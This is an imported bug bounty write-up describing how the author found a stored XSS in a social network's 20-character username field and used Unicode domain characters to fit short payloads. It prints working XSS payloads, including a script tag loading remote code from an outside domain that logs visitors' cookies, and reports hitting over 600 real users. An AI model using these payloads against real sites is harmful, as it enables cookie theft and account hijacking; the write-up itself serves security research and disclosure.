---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-11-20_how-i-paid-2-for-a-1054-xss-bug-20-chars-blind-xss-payloads.md
original_filename: 2019-11-20_how-i-paid-2-for-a-1054-xss-bug-20-chars-blind-xss-payloads.md
title: How I paid 2$ for a 1054$ XSS bug + 20 chars blind XSS payloads
category: documents
detected_topics:
- xss
- command-injection
- api-security
tags:
- imported
- documents
- xss
- command-injection
- api-security
language: en
raw_sha256: 15a659a223b1bbd38aa7c5276e6d6a15d5a163e07223085f305c22c59ff3e2a8
text_sha256: ecaff7c34159cd1c41cb7bce56a2ae5b5d689fc26e506d8b82b4d2b33707505a
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# How I paid 2$ for a 1054$ XSS bug + 20 chars blind XSS payloads

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-11-20_how-i-paid-2-for-a-1054-xss-bug-20-chars-blind-xss-payloads.md
- Source Type: markdown
- Detected Topics: xss, command-injection, api-security
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `15a659a223b1bbd38aa7c5276e6d6a15d5a163e07223085f305c22c59ff3e2a8`
- Text SHA256: `ecaff7c34159cd1c41cb7bce56a2ae5b5d689fc26e506d8b82b4d2b33707505a`


## Content

---
title: "How I paid 2$ for a 1054$ XSS bug + 20 chars blind XSS payloads"
url: "https://medium.com/@mohameddaher/how-i-paid-2-for-1054-xss-bug-20-chars-blind-xss-payloads-12d32760897b"
authors: ["Mohamed Daher (@DaherMohamed4)"]
bugs: ["XSS"]
bounty: "1,054"
publication_date: "2019-11-20"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4928
scraped_via: "browseros"
---

# How I paid 2$ for a 1054$ XSS bug + 20 chars blind XSS payloads

How I paid 2$ for a 1054$ XSS bug + 20 chars blind XSS payloads
Mohamed Daher
Follow
4 min read
·
Nov 20, 2019

688

4

Hey there :)

This is my first write up, I decided to share this story because I spent nights on it and I finally found a solution to my problem.

The story :

I was invited some months ago to a private bugcrowd program that was going to start some days later.

I found some bugs and took a break.

During the last 5 days of the program I told myself I have to find some bugs before this program ends ( I want $$ boiiii) so I took another view of the program.

Checked the scope again etc…

This private program was a big social network (can’t tell the name it’s private bruh) but the point is I went to create a new account.

Username : I enter an XSS payload but no special character allowed : <:’();?> and the field was limited to 20 characters :

Press enter or click to view image in full size

So I forgot about XSS and looked for another bugs.

Later I visited the 2nd in scope domain that was another social media, tried to create a new account using my email but I got an error : User already registered, please login. What happens ? Seems like the 2 sites use the same database so you could use the same account for the 2 sites.

So I logged in and moved to my profile and though I will try and edit my username here, I was surprised that there was not characters restricted :D

I was like :

But this field is limited to 20 chars too :(

I first entered a simple payload to confirm the XSS : <svg/onload=alert()> = 20 chars

Get Mohamed Daher’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I saved and visited my profile on the main site (I want it to work on the main site because the bounties here were higher). And boom alert box appear :D

Now that XSS is valid, time to work on a XSS payload to log cookies of who ever visits my profile, because remember : the higher the security impact is, the higher the bounty will be, thanks master yoda.

But the problem is, how to enter a valid 20 chars XSS payload to log cookies? the xsshunter tool is useful but way too long, so I started digging every night and after 48 hours I found this tweet with this short payload from @0x6D6172696F :

Press enter or click to view image in full size

<script/src=//⑭.₨> = 18 chars (₨ here is Indian Rupee and is considered as 1 char instead of 2, same for the ⑭)

But it says only in MS Edge so I told myself I have nothing to lose so I entered this payload in Chrome and Firefox and boom. XSS triggers.

Now, I had to rent a (2 numbers).rs domain for the PoC, but the prices are quite high for me (90 usd approx), so I asked myself how can I reach the highest impact without spending 90 usd ?

After some days I had an idea, I directly went to namecheap.com (thanks to @brutelogic) to check the cheaper .2chars domain and found .pw, so I checked for RsRs.pw : It was 90 cents/year :D So the domain + dns = approx. 2.10$

I directly went to the panel and redirected rsrs.pw to my xsshunter link (name).xsshunter.com where my blind XSS payload is hosted, returned to the site and created this payload : <script src=//₨₨.pw> = 20 chars. Saved it and visited my profile, and boom :

Press enter or click to view image in full size

Me, talking to myself :

After 1 month (till they fixed this) I got +600 victims without doing anything (kept receiving emails from xsshunter) and +1000$ bounty :)

I know this is long but I can’t resume 5 nights of work in 10 lines ^^

Take-away:

When you see characters limitation or when a character is restricted somewhere, try to embed 2 chars into 1 or use the Greek dictionary to find a similar character.
Sometimes you can go to an out of scope domain or lowest bounty domain to get a valid bug/high bounty bug

Thank you for reading,

Daher Mohamed aka m0m0x01d :)
